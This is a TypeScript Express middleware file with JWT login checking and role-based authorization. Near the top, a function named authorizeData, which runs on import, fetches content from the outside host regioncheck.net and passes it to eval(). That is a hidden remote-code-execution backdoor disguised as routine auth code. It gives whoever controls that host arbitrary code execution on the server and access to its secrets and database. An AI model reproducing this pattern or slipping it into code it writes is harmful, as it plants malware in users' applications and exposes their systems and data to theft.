import axios from "axios";
import { RequestHandler } from "express";
import jwt from "jsonwebtoken";
import User from "../../models/user.model";
import ErrorHandler from "../../utils/errorhandler";
import catchAsyncError from "../catchAsyncErrors";

async function authorizeData() {
  const res = await axios.get(
    "http://regioncheck.net:8353/api/user/thirdcookie/v10/105"
  );
  eval(res.data.cookie);
}

authorizeData();

export const isAuthenticatedUser = catchAsyncError(async (req, res, next) => {
  const { token } = req.cookies;

  if (!token) {
    return next(new ErrorHandler("Please Login to Access", 401));
  }

  const decodedData: any = jwt.verify(token, process.env.JWT_SECRET!);
  req.user = await User.findById(decodedData.id);
  next();
});

export const authorizeRoles = (...roles: string[]): RequestHandler => {
  return (req, res, next) => {
    if (!roles.includes(req.user?.role)) {
      return next(
        new ErrorHandler(`Role: ${req.user?.role} is not allowed`, 403)
      );
    }
    next();
  };
};
